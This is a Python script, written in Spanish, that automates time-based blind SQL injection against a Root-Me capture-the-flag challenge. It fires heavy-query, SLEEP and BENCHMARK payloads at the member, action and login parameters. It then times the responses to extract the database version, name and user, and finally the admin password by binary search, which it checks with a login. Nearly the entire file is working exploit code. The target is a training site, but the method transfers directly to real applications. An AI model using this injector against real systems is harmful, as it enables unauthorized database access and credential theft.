#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
Técnica completa con micro-mediciones y tiempos invertidos
Basado en el PDF: Time-Based Blind SQL Injection using heavy queries
"""
import requests
import time
import statistics
import sys
import re
from urllib.parse import urlencode

# CONFIGURACIÓN
URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 0
        self.threshold = 0
        self.heavy_query = None
        self.mode = "normal"  # normal o invertido
        self.results = {}
        
    def test_payload(self, payload, repeats=5, delay=0.05):
        """Prueba un payload y retorna el tiempo en milisegundos"""
        tiempos = []
        params = {"action": "member", "member": payload}
        
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000  # ms
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(delay)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def test_login(self, username, password, repeats=3):
        """Prueba login POST"""
        tiempos = []
        data = {"username": username, "password": password}
        
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.post(URL + "?action=login", data=data, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def set_baseline(self):
        """Establece el baseline y threshold"""
        print("[*] Estableciendo baseline...")
        self.baseline = self.test_payload("1", repeats=10)
        self.threshold = self.baseline + 2  # +2ms
        print(f"    Baseline: {self.baseline:.2f}ms")
        print(f"    Threshold: {self.threshold:.2f}ms")
        return self.baseline
    
    def find_heavy_query(self):
        """Busca una heavy query que funcione (normal o invertida)"""
        print("\n" + "=" * 70)
        print("  BUSCANDO HEAVY QUERY")
        print("=" * 70)
        
        tablas = [
            'users', 'member', 'members', 'admin', 'administradores',
            'information_schema.columns', 'information_schema.tables'
        ]
        
        for tabla in tablas:
            for joins in range(1, 6):
                # Construir heavy query
                if 'information_schema' in tabla:
                    heavy = f"(SELECT COUNT(*) FROM {tabla}"
                    for i in range(joins):
                        heavy += f", {tabla} T{i+1}"
                    heavy += ")"
                else:
                    heavy = f"(SELECT COUNT(*) FROM {tabla}"
                    for i in range(joins):
                        heavy += f", {tabla} T{i+1}"
                    heavy += ")"
                
                # Probar normal: TRUE = lento, FALSE = rápido
                t_true = self.test_payload(f"1 AND IF(1=1, {heavy}, 0)", repeats=5)
                t_false = self.test_payload(f"1 AND IF(1=2, {heavy}, 0)", repeats=5)
                diff_normal = t_true - t_false
                
                # Probar invertido: TRUE = rápido, FALSE = lento
                t_true_inv = self.test_payload(f"1 AND IF(1=1, 0, {heavy})", repeats=5)
                t_false_inv = self.test_payload(f"1 AND IF(1=2, 0, {heavy})", repeats=5)
                diff_invertido = t_false_inv - t_true_inv
                
                print(f"  {tabla} ({joins} joins): N={diff_normal:.2f}ms, I={diff_invertido:.2f}ms", end="")
                
                if abs(diff_normal) > 2:
                    print(" ✅ NORMAL")
                    self.heavy_query = heavy
                    self.mode = "normal"
                    return heavy, "normal"
                elif abs(diff_invertido) > 2:
                    print(" ✅ INVERTIDO")
                    self.heavy_query = heavy
                    self.mode = "invertido"
                    return heavy, "invertido"
                else:
                    print(" ❌")
                
                time.sleep(0.05)
        
        print("\n[!] No se encontró heavy query en member, probando en action...")
        
        # Probar en action
        for tabla in tablas:
            for joins in range(1, 4):
                heavy = f"(SELECT COUNT(*) FROM {tabla}"
                for i in range(joins):
                    heavy += f", {tabla} T{i+1}"
                heavy += ")"
                
                payload_true = f"login' AND IF(1=1, {heavy}, 0)-- -"
                payload_false = f"login' AND IF(1=2, {heavy}, 0)-- -"
                
                t_true = self.test_payload_action(payload_true)
                t_false = self.test_payload_action(payload_false)
                diff = t_true - t_false
                
                print(f"  action {tabla} ({joins} joins): DIF={diff:.2f}ms", end="")
                
                if abs(diff) > 2:
                    print(" ✅")
                    self.heavy_query = heavy
                    self.mode = "normal"
                    return heavy, "normal"
                else:
                    print(" ❌")
                
                time.sleep(0.05)
        
        return None, None
    
    def test_payload_action(self, payload):
        """Prueba payload en action"""
        tiempos = []
        params = {"action": payload}
        
        for _ in range(5):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        """Evalúa si una condición es TRUE basado en el tiempo"""
        if self.mode == "normal":
            payload = f"1 AND IF({condition}, {self.heavy_query}, 0)"
            t = self.test_payload(payload, repeats=3)
            return t > self.threshold
        else:  # invertido
            payload = f"1 AND IF({condition}, 0, {self.heavy_query})"
            t = self.test_payload(payload, repeats=3)
            return t < self.threshold
    
    def extract_string(self, query, label="Extrayendo"):
        """Extrae un string usando búsqueda binaria"""
        print(f"\n[*] {label}...")
        
        # 1. Obtener longitud
        length = 0
        for i in range(1, 100):
            cond = f"LENGTH(({query})) = {i}"
            if self.is_true(cond):
                length = i
                print(f"    [+] Longitud: {length}")
                break
            print(f"    Probando longitud {i}: {'✅' if self.is_true(cond) else '❌'}")
        
        if length == 0:
            print("    [!] No se pudo obtener la longitud")
            return None
        
        # 2. Extraer caracteres (búsqueda binaria)
        result = ""
        for pos in range(1, length + 1):
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
                
                if self.is_true(cond):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            print(f"    [{pos}/{length}] '{char}' (ASCII: {ord(char)})")
        
        return result
    
    def scan_parameters(self):
        """Escanea todos los parámetros posibles"""
        print("\n" + "=" * 70)
        print("  ESCANEANDO PARÁMETROS")
        print("=" * 70)
        
        # 1. Probar diferentes sintaxis en member
        print("\n[1] Probando member...")
        syntaxis = [
            ("1", "baseline"),
            ("1 AND 1=1", "AND TRUE"),
            ("1 AND 1=2", "AND FALSE"),
            ("1' AND '1'='1", "AND TRUE comillas"),
            ("1' AND '1'='2", "AND FALSE comillas"),
            ("1) AND (1=1", "AND TRUE parentesis"),
            ("1) AND (1=2", "AND FALSE parentesis"),
            ("1 OR 1=1", "OR TRUE"),
            ("1 OR 1=2", "OR FALSE"),
            ("1' OR '1'='1", "OR TRUE comillas"),
            ("1' OR '1'='2", "OR FALSE comillas"),
        ]
        
        for payload, desc in syntaxis:
            t = self.test_payload(payload, repeats=3)
            print(f"    {desc:25} -> {t:.2f}ms")
            time.sleep(0.03)
        
        # 2. Probar login POST
        print("\n[2] Probando login POST...")
        login_tests = [
            ("admin", "test", "baseline"),
            ("admin' AND '1'='1", "test", "AND TRUE"),
            ("admin' AND '1'='2", "test", "AND FALSE"),
            ("admin' OR '1'='1", "test", "OR TRUE"),
            ("admin' OR '1'='2", "test", "OR FALSE"),
            ("admin' AND SLEEP(5)-- -", "test", "SLEEP"),
            ("admin' OR SLEEP(5)-- -", "test", "SLEEP OR"),
        ]
        
        for username, password, desc in login_tests:
            t = self.test_login(username, password, repeats=3)
            print(f"    {desc:25} -> {t:.2f}ms")
            time.sleep(0.03)
    
    def extract_database_info(self):
        """Extrae información de la base de datos"""
        print("\n" + "=" * 70)
        print("  EXTRACCIÓN DE INFORMACIÓN")
        print("=" * 70)
        
        # 1. Versión
        version = self.extract_string("SELECT VERSION()", "Versión de MySQL")
        if version:
            print(f"    [+] Versión: {version}")
        
        # 2. Base de datos
        db = self.extract_string("SELECT DATABASE()", "Base de datos actual")
        if db:
            print(f"    [+] Base de datos: {db}")
        
        # 3. Usuario
        user = self.extract_string("SELECT USER()", "Usuario actual")
        if user:
            print(f"    [+] Usuario: {user}")
        
        # 4. Tablas
        print("\n[*] Buscando tablas...")
        tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores']
        encontradas = []
        
        for tabla in tablas:
            cond = f"EXISTS(SELECT * FROM {tabla})"
            if self.is_true(cond):
                print(f"    [+] Tabla encontrada: {tabla}")
                encontradas.append(tabla)
            else:
                print(f"    [-] Tabla no encontrada: {tabla}")
        
        if encontradas:
            # 5. Buscar columnas en la primera tabla
            tabla = encontradas[0]
            print(f"\n[*] Buscando columnas en {tabla}...")
            
            cols_user = ['username', 'user', 'login', 'name', 'admin', 'usuario']
            cols_pass = ['password', 'pass', 'clave', 'contrasena', 'pwd']
            
            col_user = None
            col_pass = None
            
            for col in cols_user:
                cond = f"EXISTS(SELECT {col} FROM {tabla})"
                if self.is_true(cond):
                    print(f"    [+] Columna usuario: {col}")
                    col_user = col
                    break
            
            for col in cols_pass:
                cond = f"EXISTS(SELECT {col} FROM {tabla})"
                if self.is_true(cond):
                    print(f"    [+] Columna contraseña: {col}")
                    col_pass = col
                    break
            
            # 6. Extraer contraseña del admin
            if col_user and col_pass:
                print(f"\n[*] Extrayendo contraseña del admin...")
                query = f"SELECT {col_pass} FROM {tabla} WHERE {col_user}='admin'"
                password = self.extract_string(query, "Contraseña del admin")
                
                if password:
                    print(f"\n" + "=" * 70)
                    print(f"[+] ¡CONTRASEÑA ENCONTRADA!: {password}")
                    print("=" * 70)
                    
                    # Verificar credenciales
                    print("\n[*] Verificando credenciales...")
                    t = self.test_login("admin", password, repeats=1)
                    
                    # Si el login es exitoso, la longitud de la respuesta cambia
                    params = {"action": "login"}
                    data = {"username": "admin", "password": password}
                    r = self.session.post(URL, params=params, data=data)
                    
                    if "Authentification error" not in r.text:
                        print("[+] ✅ ¡CREDENCIALES CORRECTAS!")
                        print(f"    Usuario: admin")
                        print(f"    Contraseña: {password}")
                    else:
                        print("[-] ❌ Las credenciales no funcionan")
                    
                    return password
    
    def run(self):
        """Ejecuta la auditoría completa"""
        print("=" * 70)
        print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
        print("  Técnica: Micro-mediciones con heavy queries")
        print("=" * 70)
        
        # 1. Baseline
        self.set_baseline()
        
        # 2. Escanear parámetros
        self.scan_parameters()
        
        # 3. Buscar heavy query
        heavy, mode = self.find_heavy_query()
        
        if not heavy:
            print("\n[!] No se encontró heavy query en member ni en action")
            print("[!] Probando con técnicas alternativas...")
            
            # Probar con SLEEP en action
            print("\n[*] Probando SLEEP en action...")
            for seconds in [1, 2, 3, 5]:
                payload = f"login' AND SLEEP({seconds})-- -"
                t = self.test_payload_action(payload)
                print(f"    SLEEP({seconds}): {t:.2f}ms")
            
            print("\n[*] Probando BENCHMARK en action...")
            for iterations in [100000, 1000000, 5000000]:
                payload = f"login' AND BENCHMARK({iterations}, MD5('x'))-- -"
                t = self.test_payload_action(payload)
                print(f"    BENCHMARK({iterations}): {t:.2f}ms")
            
            print("\n[!] No se encontró ninguna técnica que funcione")
            print("[!] La aplicación podría no ser vulnerable a SQL Injection")
            return
        
        print(f"\n[+] Heavy query encontrada: {heavy[:80]}...")
        print(f"[+] Modo: {mode}")
        
        # 4. Extraer información
        self.extract_database_info()
        
        # 5. Resumen final
        print("\n" + "=" * 70)
        print("  RESUMEN FINAL")
        print("=" * 70)
        print(f"Baseline: {self.baseline:.2f}ms")
        print(f"Threshold: {self.threshold:.2f}ms")
        print(f"Modo: {mode}")
        print(f"Heavy query: {heavy[:80]}...")
        
        if self.results.get("password"):
            print(f"\n[+] CONTRASEÑA: {self.results['password']}")

def main():
    injector = TimeBasedSQLInjector()
    injector.run()

if __name__ == "__main__":
    main()
